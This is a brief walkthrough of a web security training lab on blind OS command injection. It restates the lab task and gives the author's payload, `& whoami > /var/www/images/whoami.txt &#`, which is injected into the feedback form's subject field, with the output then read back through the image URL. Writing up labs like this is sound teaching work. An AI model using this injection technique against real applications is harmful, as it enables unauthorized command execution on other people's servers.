Title: Blind OS command injection with output redirection
Level: Practitioner
Desc:  This lab contains a blind OS command injection vulnerability in the feedback function.
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
To solve the lab, execute the whoami command and retrieve the output. 

# Walkthrough: 

My payload: `& whoami > /var/www/images/whoami.txt &#`
Inject in subject, url encode.

Look for in this request: `https://0aa100b10401077080162b1b00830092.web-security-academy.net/image?filename=whoami.txt`

<img width="934" height="131" alt="image" src="https://github.com/user-attachments/assets/7044c85f-effe-40f4-86a0-7561bd7027c6" />

